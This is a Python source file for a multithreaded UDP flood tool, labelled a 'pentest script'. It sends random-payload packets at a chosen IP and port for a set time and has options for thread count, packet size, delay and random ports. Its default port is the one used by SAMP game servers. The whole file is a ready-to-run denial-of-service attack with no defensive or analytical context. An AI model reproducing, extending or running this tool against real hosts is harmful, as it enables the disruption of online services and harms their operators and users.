import socket
import random
import threading
import argparse
import time
import os

def flood_worker(ip, port, duration, min_size, max_size, delay, random_port):
    timeout = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    while time.time() < timeout:
        size = random.randint(min_size, max_size)
        data = os.urandom(size)
        target_port = port if not random_port else random.randint(1024, 65535)
        try:
            sock.sendto(data, (ip, target_port))
        except Exception:
            pass
        if delay > 0:
            time.sleep(delay)

def main():
    parser = argparse.ArgumentParser(description="Advanced UDP Flood Pentest Script")
    parser.add_argument("ip", help="Target IP or hostname")
    parser.add_argument("port", type=int, help="Base port to flood (default: 7777 for SAMP)")
    parser.add_argument("duration", type=int, help="Duration in seconds")
    parser.add_argument("--threads", type=int, default=20, help="Number of threads")
    parser.add_argument("--min", type=int, default=500, help="Minimum packet size (bytes)")
    parser.add_argument("--max", type=int, default=1400, help="Maximum packet size (bytes)")
    parser.add_argument("--delay", type=float, default=0.0001, help="Delay between packets (seconds)")
    parser.add_argument("--randomport", action="store_true", help="Flood random UDP ports")

    args = parser.parse_args()

    print(f"[+] Starting UDP flood on {args.ip}:{args.port} for {args.duration} seconds...")
    print(f"[!] Threads: {args.threads} | Size: {args.min}-{args.max} | Delay: {args.delay}s | RandomPort: {args.randomport}")

    threads = []
    for _ in range(args.threads):
        t = threading.Thread(target=flood_worker, args=(
            args.ip, args.port, args.duration,
            args.min, args.max, args.delay,
            args.randomport
        ))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    print("[✓] Flood test completed.")

if __name__ == "__main__":
    main()
